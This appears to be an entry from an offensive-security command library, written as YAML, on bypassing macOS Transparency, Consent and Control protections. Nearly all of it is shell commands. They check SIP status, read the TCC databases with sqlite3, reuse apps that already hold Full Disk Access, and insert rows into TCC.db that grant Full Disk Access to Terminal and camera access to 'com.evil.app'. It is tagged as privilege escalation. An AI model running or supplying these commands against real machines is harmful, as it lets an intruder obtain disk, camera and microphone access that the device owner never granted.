---
description: |
  Bypass macOS Transparency, Consent, and Control (TCC) protections by querying or modifying the TCC database, abusing FDA apps, and exploiting SIP status.
commands:
  - have: Shell
    cmd: |
      # ============================================================
      # ENUMERATION — Check SIP and TCC status
      # ============================================================

      # Check SIP (System Integrity Protection) status
      csrutil status

      # Locate TCC databases
      ls -la /Library/Application\ Support/com.apple.TCC/
      ls -la ~/Library/Application\ Support/com.apple.TCC/

      # ============================================================
      # QUERY — Read TCC database entries
      # ============================================================

      # Query user-level TCC database (services and clients with access)
      sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT service, client FROM access;"

      # Query system-level TCC database (requires root or FDA)
      sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT * FROM access;"

      # List apps with Full Disk Access (FDA)
      sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "SELECT client FROM access WHERE service='kTCCServiceSystemPolicyAllFiles' AND allowed=1"

      # List apps with camera access
      sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "SELECT client FROM access WHERE service='kTCCServiceCamera' AND allowed=1"

      # ============================================================
      # EXPLOIT 1: Abuse apps with existing FDA
      # ============================================================

      # If Terminal.app has FDA, you already have full disk access
      # Any command run in Terminal inherits its FDA permissions
      cat /Library/Application\ Support/com.apple.TCC/TCC.db

      # If another app has FDA, try to inject or abuse it
      # (e.g., script editors, automation tools)

      # ============================================================
      # EXPLOIT 2: Modify TCC.db (only if SIP is disabled)
      # ============================================================

      # Grant FDA to Terminal.app
      sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db "INSERT INTO access VALUES('kTCCServiceSystemPolicyAllFiles','com.apple.Terminal',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,0)"

      # Grant camera/microphone access to an app
      sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db "INSERT INTO access VALUES('kTCCServiceCamera','com.evil.app',0,2,4,1,NULL,NULL,0,'UNUSED',NULL,0,0)"

      # Reset TCC permissions for a specific app
      tccutil reset All com.apple.Terminal
phase:
  - PrivEsc
target_os:
  - macOS
services: []
techniques:
  - TCC_Bypass
references:
  - https://book.hacktricks.xyz/macos-hardening/macos-security-and-privilege-escalation/macos-security-protections/macos-tcc
---
